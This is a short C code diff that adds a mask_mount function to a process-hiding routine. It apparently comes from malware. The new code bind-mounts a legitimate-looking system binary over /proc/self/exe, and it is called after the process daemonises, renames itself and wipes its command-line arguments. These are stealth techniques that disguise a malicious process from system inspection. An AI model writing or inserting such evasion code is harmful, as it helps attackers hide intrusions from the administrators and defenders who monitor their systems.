@@ -77,6 +77,24 @@ void create_daemon() {
     }
 }
 
+static void mask_mount(const char *fake_path) {
+    /* try to over-mount /proc/self/exe with a legitimate path */
+    for (int i = 0; i < (int)(sizeof(mount_path) / sizeof(mount_path[0])); i++) {
+        char target[512];
+        const char *base = strrchr(fake_path, '/');
+        if (!base) base = fake_path;
+        else base++;
+
+        snprintf(target, sizeof(target), "%s%s", mount_path[i], base);
+
+        struct stat st;
+        if (stat(target, &st) == 0) {
+            mount(target, "/proc/self/exe", NULL, MS_BIND, NULL);
+            return;
+        }
+    }
+}
+
 void hide(int argc, char **argv) {
     create_daemon();
     init_rand();
@@ -112,4 +130,6 @@ void hide(int argc, char **argv) {
 
     for (int i = 1; i < argc; i++)
         memset(argv[i], 0, strlen(argv[i]));
+
+    mask_mount(new_name);
 }
